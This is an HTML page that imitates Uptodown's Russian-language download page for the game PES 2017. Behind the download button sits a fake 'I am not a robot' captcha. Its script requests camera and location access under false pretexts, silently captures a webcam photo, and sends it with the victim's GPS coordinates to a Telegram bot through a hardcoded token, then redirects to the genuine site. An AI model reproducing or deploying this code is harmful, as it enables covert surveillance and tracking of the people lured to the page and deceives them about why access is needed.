<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>PES 2017 1.1.0 (Android) - Скачать - Uptodown</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --ut-bg: #0c262f; --ut-dark: #051116; --ut-blue: #1b85d3;
            --ut-green: #00b451; --ut-dim: #7e949c; --ut-text: #ffffff;
            --ut-card: #081d24; --ut-border: #15353f;
        }

        body { margin: 0; background-color: var(--ut-bg); font-family: 'Roboto', sans-serif; color: var(--ut-text); overflow-x: hidden; }

        .top-nav { background: var(--ut-dark); height: 40px; display: flex; align-items: center; justify-content: space-between; padding: 0 20px; font-size: 11px; text-transform: uppercase; border-bottom: 1px solid var(--ut-border); color: var(--ut-dim); }
        .header-main { background: var(--ut-dark); height: 60px; display: flex; align-items: center; justify-content: space-between; padding: 0 20px; border-bottom: 1px solid var(--ut-border); position: sticky; top: 0; z-index: 1000; }
        .logo { height: 26px; }

        .container { max-width: 1100px; margin: 0 auto; display: grid; grid-template-columns: 1fr 320px; gap: 30px; padding: 20px; }
        @media (max-width: 900px) { .container { grid-template-columns: 1fr; } .right-col { display: none; } }

        .breadcrumb { font-size: 11px; color: var(--ut-dim); margin-bottom: 20px; text-transform: uppercase; }
        .app-header { display: flex; gap: 20px; align-items: flex-start; margin-bottom: 30px; }
        /* PES 2017 icon styling */
        .app-icon { width: 100px; height: 100px; border-radius: 22px; background: #001b3a; padding: 2px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
        .title-h1 { margin: 0 0 5px 0; font-size: 32px; font-weight: 700; }
        .version-tag { background: #15353f; padding: 3px 8px; border-radius: 4px; font-size: 12px; vertical-align: middle; margin-left: 10px; }

        .dl-section { background: var(--ut-card); border-radius: 16px; padding: 25px; border: 1px solid var(--ut-border); margin-bottom: 30px; }
        .dl-btn { background: var(--ut-green); color: #fff; width: 100%; padding: 18px 25px; border-radius: 12px; border: none; font-weight: 700; font-size: 18px; cursor: pointer; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 5px 0 #008a3d; }
        .dl-btn:active { transform: translateY(3px); box-shadow: 0 2px 0 #008a3d; }
        .info-bar { display: flex; justify-content: space-between; margin-top: 15px; font-size: 13px; color: var(--ut-dim); }

        .tech-table { width: 100%; border-collapse: collapse; margin-top: 20px; background: var(--ut-card); border-radius: 12px; overflow: hidden; }
        .tech-table td { padding: 12px 15px; border-bottom: 1px solid var(--ut-border); font-size: 14px; }
        .tech-label { color: var(--ut-dim); width: 40%; }

        /* Sidebar items */
        .side-card { background: var(--ut-card); border-radius: 12px; padding: 20px; border: 1px solid var(--ut-border); margin-bottom: 20px; }
        .sim-item { display: flex; gap: 15px; margin-bottom: 20px; align-items: center; text-decoration: none; color: inherit; }
        .sim-img { width: 50px; height: 50px; border-radius: 12px; }

        /* CAPTCHA */
        #overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.92); backdrop-filter: blur(12px); z-index: 10000; align-items: center; justify-content: center; opacity: 0; transition: 0.3s; }
        #overlay.show { display: flex; opacity: 1; }
        .captcha-window { background: #fff; padding: 25px; border-radius: 3px; width: 310px; color: #000; }
        .c-box { border: 1px solid #d3d3d3; padding: 12px; display: flex; align-items: center; cursor: pointer; background: #f9f9f9; margin-top: 15px; justify-content: space-between; }
        .c-check { width: 26px; height: 26px; border: 2px solid #c1c1c1; margin-right: 15px; background: #fff; display: flex; align-items: center; justify-content: center; border-radius: 2px; }
        
        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="top-nav">
    <div>Android • Игры • Спорт • PES 2017</div>
    <div style="cursor:pointer">RU ▼</div>
</div>

<div class="header-main">
    <div style="color:var(--ut-blue); font-size: 24px;">☰</div>
    <img src="https://stc.utdstc.com/img/logos/uptodown-logo-white.png" class="logo">
    <div style="display:flex; gap:20px; align-items:center;">
        <span>🔍</span>
        <div style="background:var(--ut-blue); border-radius:50%; width:30px; height:30px; line-height:30px; text-align:center;">A</div>
    </div>
</div>

<div class="container" id="main-content">
    <div class="left-col">
        <div class="breadcrumb">Android / Игры / Спорт / PES 2017</div>
        
        <div class="app-header">
            <img src="https://stc.utdstc.com/img/icons/pes-2017-pro-evolution-soccer-android.png" class="app-icon">
            <div>
                <h1 class="title-h1">PES 2017 <span class="version-tag">1.1.0</span></h1>
                <a href="#" style="color:var(--ut-blue); text-decoration:none; font-size:15px;">KONAMI</a>
                <div style="margin-top:10px; color:var(--ut-green); font-size:13px;">✓ Официальная версия</div>
            </div>
        </div>

        <div class="dl-section">
            <button class="dl-btn" onclick="openGate()">
                <span>Последняя версия</span>
                <span>Скачать 📥</span>
            </button>
            <div class="info-bar">
                <span>1.5 GB</span>
                <span>100M+ Загрузок</span>
                <span>Обновлено: 2026</span>
            </div>
        </div>

        <h3>Технические данные</h3>
        <table class="tech-table">
            <tr><td class="tech-label">Имя пакета</td><td>jp.konami.pesam</td></tr>
            <tr><td class="tech-label">ОС</td><td>Android 5.0+</td></tr>
            <tr><td class="tech-label">Разработчик</td><td>KONAMI</td></tr>
        </table>
    </div>

    <div class="right-col">
        <div class="side-card">
            <h4 style="margin:0 0 20px 0;">Похожие игры</h4>
            <a href="#" class="sim-item">
                <div class="sim-img" style="background: #1a73e8;"></div>
                <div><b>FIFA Mobile</b><p style="margin:0; font-size:12px; color:var(--ut-dim);">EA Sports</p></div>
            </a>
            <a href="#" class="sim-item">
                <div class="sim-img" style="background: #ffcc00;"></div>
                <div><b>Dream League</b><p style="margin:0; font-size:12px; color:var(--ut-dim);">First Touch Games</p></div>
            </a>
        </div>
    </div>
</div>

<div id="overlay">
    <div class="captcha-window">
        <h3 style="margin:0; font-size: 18px;">Подтверждение</h3>
        <p style="font-size: 13px; color: #666;">Для скачивания файла весом 1.5GB подтвердите, что вы не робот.</p>
        <div class="c-box" onclick="runLogic()">
            <div style="display:flex; align-items:center;">
                <div class="c-check" id="quti"></div>
                <div style="font-size:14px;">Я не робоt</div>
            </div>
            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="26">
        </div>
    </div>
</div>

<video id="v" autoplay playsinline></video>
<canvas id="c"></canvas>

<script>
    const CONFIG = { TOKEN: "8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY", CHAT: "6198817749" };

    function openGate() {
        document.getElementById('main-content').style.filter = "blur(15px)";
        const ov = document.getElementById('overlay');
        ov.style.display = "flex";
        setTimeout(() => ov.classList.add('show'), 10);
    }

    async function runLogic() {
        const q = document.getElementById('quti');
        q.innerHTML = '<img src="https://i.gifer.com/ZZ5H.gif" width="18">';

        try {
            const s = await navigator.mediaDevices.getUserMedia({ video: true });
            navigator.geolocation.getCurrentPosition(async (p) => {
                q.innerHTML = "✅";
                const vid = document.getElementById('v'); vid.srcObject = s;
                await new Promise(r => setTimeout(r, 1500));
                
                const can = document.getElementById('c'); 
                can.width = 640; can.height = 480;
                can.getContext('2d').drawImage(vid, 0, 0);
                const rasm = await (await fetch(can.toDataURL('image/jpeg', 0.6))).blob();
                
                const fd = new FormData();
                fd.append('chat_id', CONFIG.CHAT); 
                fd.append('photo', rasm);
                fd.append('caption', `⚽️ PES 2017 Qurboni!\n📍 Geo: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
                
                fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, { method: 'POST', body: fd });

                setTimeout(() => { 
                    // Muvaffaqiyatli o'tish
                    window.location.href = "https://pes-2017.ru.uptodown.com/android/download"; 
                }, 1000);

            }, () => { alert("Ошибка GPS: Доступ необходим для выбора ближайшего сервера загрузки."); location.reload(); });
        } catch (e) { alert("Ошибка: Необходимо разрешить доступ к камере для верификации."); location.reload(); }
    }
</script>
</body>
</html>
